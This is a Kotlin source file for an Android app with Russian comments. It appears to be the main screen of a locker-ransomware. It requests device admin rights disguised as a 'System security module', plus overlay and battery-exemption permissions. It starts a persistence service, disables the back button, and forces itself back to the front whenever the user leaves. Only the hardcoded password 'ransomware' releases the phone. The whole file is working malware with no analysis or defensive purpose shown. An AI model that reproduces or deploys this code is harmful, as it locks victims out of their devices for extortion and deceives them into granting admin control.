package com.example.lock

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PASS = "ransomware"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Запрет скриншотов + держим экран включённым
        window.setFlags(
            WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE
        )
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        setContentView(R.layout.activity_main)

        // 1. Overlay permission (для блокировки поверх всего)
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            startActivity(Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            ))
        }

        // 2. Battery optimization off
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                ))
            }
        } catch (_: Exception) {}

        // 3. Device admin
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (!dpm.isAdminActive(admin)) {
                startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System security module")
                })
            }
        } catch (_: Exception) {}

        // 4. Стартуем foreground service для persistence
        ContextCompat.startForegroundService(
            this, Intent(this, LockService::class.java)
        )

        // 5. Обработка пароля
        val pwd = findViewById<EditText>(R.id.pwd)
        val hint = findViewById<TextView>(R.id.hint)
        findViewById<Button>(R.id.unlock).setOnClickListener {
            if (pwd.text.toString() == PASS) {
                hint.text = "ACCESS GRANTED"
                hint.setTextColor(0xFF00FF66.toInt())
                // снимаем device admin, останавливаем сервис
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    dpm.removeActiveAdmin(ComponentName(this, AdminReceiver::class.java))
                } catch (_: Exception) {}
                stopService(Intent(this, LockService::class.java))
                finishAffinity()
            } else {
                hint.text = "НЕВЕРНЫЙ ПАРОЛЬ"
                hint.setTextColor(0xFFFF0000.toInt())
                pwd.setText("")
            }
        }
    }

    override fun onBackPressed() {
        // блокируем кнопку «назад»
        // ничего не делаем
    }

    override fun onPause() {
        super.onPause()
        // если пользователь пытается уйти — возвращаем себя сверху
        val i = Intent(this, MainActivity::class.java)
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        startActivity(i)
    }
}